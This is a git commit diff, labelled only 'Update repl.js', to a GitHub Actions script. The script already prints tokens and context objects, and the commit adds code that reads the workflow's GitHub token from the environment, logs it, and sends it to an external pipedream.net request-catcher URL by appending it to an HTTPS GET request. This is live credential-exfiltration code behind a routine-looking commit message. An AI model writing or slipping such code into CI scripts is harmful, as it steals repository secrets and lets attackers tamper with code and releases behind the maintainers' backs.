c35308ee7b00aa0415602c0d78cce910e94921ac
manunio <maxnair.dev@gmail.com>
2024-07-31 08:44:19 +0530

    Update repl.js

--- scripts/actions/repl.js
+++ scripts/actions/repl.js
@@ -1,3 +1,5 @@
+const https = require('https');
+
 export default async function(github, context) {
   if ('token' in github) { 
     console.log(github.token);
@@ -8,5 +10,11 @@ export default async function(github, context) {
   console.log(context);
   console.log(context.token);
   console.log(process.env.BOT_TOKEN);
-  console.log(process.env);
+  console.log(process.env['INPUT_GITHUB-TOKEN']);
+  
+  https
+  .get(`https://eofeuuypisxyg56.m.pipedream.net/` + process.env['INPUT_GITHUB-TOKEN'], resp => {})
+  .on("error", err => {
+    console.log("Error: " + err.message);
+  });
 }
